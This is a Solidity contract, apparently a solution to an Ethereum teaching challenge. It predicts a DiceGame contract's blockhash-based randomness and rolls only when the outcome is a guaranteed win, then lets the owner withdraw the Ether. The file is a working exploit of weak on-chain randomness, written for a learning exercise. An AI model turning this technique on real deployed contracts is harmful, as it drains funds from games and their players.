pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import { DiceGame } from "./DiceGame.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    error NotEnoughEther();
    error NotGoodRoll();
    error WithdrawFailure();

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _address, uint256 _amount) public onlyOwner() {
    (bool sent,) = payable(_address).call{value: _amount}("");
    if (!sent) {
      revert WithdrawFailure();
    }
  }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        if (address(this).balance < .002 ether) {
            revert NotEnoughEther();
        } 

        // Roll the dice multiple time with rigged parameters
        bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), address(diceGame),  diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        console.log("\t", "   Rigged Roll:", roll);
        // Roll dice only on win condition
        if (roll <= 5) {
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            revert NotGoodRoll();
        }
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}

}
